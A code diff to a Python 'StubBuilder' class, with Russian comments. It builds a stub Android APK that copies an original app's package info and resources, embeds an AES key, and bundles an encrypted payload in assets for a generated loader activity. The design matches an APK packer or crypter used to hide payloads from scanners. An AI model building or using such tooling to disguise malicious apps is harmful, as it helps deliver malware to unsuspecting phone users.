@@ -94,8 +94,8 @@ class StubBuilder:
             with open(drawable_dir / "ic_launcher.xml", "w") as f:
                 f.write(xml_icon)
     
-    def build_stub_apk(self, aes_key_hex: str, original_apk_path: str) -> str:
-        """Собирает stub APK с встроенным ключом"""
+    def build_stub_apk(self, aes_key_hex: str, original_apk_path: str, encrypted_payload: bytes) -> str:
+        """Собирает stub APK с встроенным ключом и payload"""
         
         # Извлекаем информацию из оригинального APK
         apk_info = self.extract_apk_info(original_apk_path)
@@ -113,6 +113,10 @@ class StubBuilder:
         
         # Извлекаем ресурсы из оригинального APK
         self.extract_resources(original_apk_path, project_dir, apk_info)
+        
+        # Сохраняем зашифрованный payload в assets
+        with open(project_dir / "assets" / "payload.bin", "wb") as f:
+            f.write(encrypted_payload)
         
         # Генерируем LoaderActivity.java
         loader_code = self.generate_loader_activity(aes_key_hex, apk_info["package"])
@@ -138,7 +142,7 @@ class StubBuilder:
         # Конвертируем class -> dex
         self.convert_to_dex(project_dir)
         
-        # Собираем APK
+        # Собираем APK (с assets внутри)
         unsigned_apk = self.package_apk(project_dir)
         
         # Подписываем APK
@@ -183,19 +187,21 @@ class StubBuilder:
         subprocess.run(cmd, check=True)
     
     def package_apk(self, project_dir: Path) -> str:
-        """Упаковывает APK"""
+        """Упаковывает APK с assets"""
         unsigned_apk = project_dir / "stub_unsigned.apk"
         dex_file = project_dir / "bin" / "classes.dex"
+        assets_dir = project_dir / "assets"
         
         aapt_path = f"{self.build_tools}/aapt"
         
-        # Создаем базовый APK с ресурсами
+        # Создаем базовый APK с ресурсами и assets
         cmd = [
             aapt_path,
             "package",
             "-f",
             "-M", str(project_dir / "AndroidManifest.xml"),
             "-S", str(project_dir / "res"),
+            "-A", str(assets_dir),  # Добавляем assets
             "-I", f"{self.platform}/android.jar",
             "-F", str(unsigned_apk)
         ]
